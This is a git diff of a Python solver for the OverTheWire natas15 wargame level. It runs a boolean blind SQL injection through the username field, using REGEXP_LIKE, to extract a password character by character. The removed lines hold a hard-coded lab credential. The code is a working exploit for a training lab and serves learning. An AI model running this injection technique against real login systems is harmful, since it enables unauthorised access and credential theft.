@@ -1,38 +1,32 @@
-from html.parser import HTMLParser
-import requests
 import string
+import Auther
 
-target = "http://natas15.natas.labs.overthewire.org/"
-# Replace with natas15 password
-auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
 password = ""
-token = "This user exists"
 
 
-def injection(prefix: str, nextChar: str):
-    # LIKE "...%" COLLATE utf8mb4_0900_as_cs
-    return {'username': f'natas16" AND REGEXP_LIKE(password, "^{prefix}{nextChar}[[:alnum:]]*", "c") AND "" LIKE "'}
+def predicate(prefix: str, nextChar: str):
+    data = {
+        'username': f'natas16" AND REGEXP_LIKE(password, "^{prefix}{nextChar}[[:alnum:]]*", "c") AND "" LIKE "'}
+    return "This user exists" in Auther.request(15, data=data).text
 
 
-for i in range(len(password), 32):  # 32-character password
+while predicate(password, '[[:alnum:]]'):  # 32-character password
+    print(f"Progress: {password.ljust(32, '*')} -> ", end="")
     chosen_chaset = string.ascii_letters
-    r = requests.post(target, injection(password, '[[:alpha:]]'), auth=auth)
-    if token in r.text:
-        r = requests.post(
-            target, injection(password, '[[:upper:]]'), auth=auth)
-        chosen_chaset = string.ascii_uppercase if token in r.text else string.ascii_lowercase
+    if predicate(password, '[[:alpha:]]'):
+        chosen_chaset = string.ascii_uppercase if predicate(
+            password, '[[:upper:]]') else string.ascii_lowercase
     else:
         chosen_chaset = string.digits
     best = None
     for char in chosen_chaset:
-        r = requests.post(target, injection(password, char), auth=auth)
-        if token in r.text:
+        if predicate(password, char):
             best = char
             break
     if best is None:
-        print("Error, last request received: ", r.text)
-        break
+        print("Error")
+        continue
     password += char
-    print(f"Progress: {password.ljust(32, '*')}")
+    print(password)
 
 print(f"Final password: {password}")
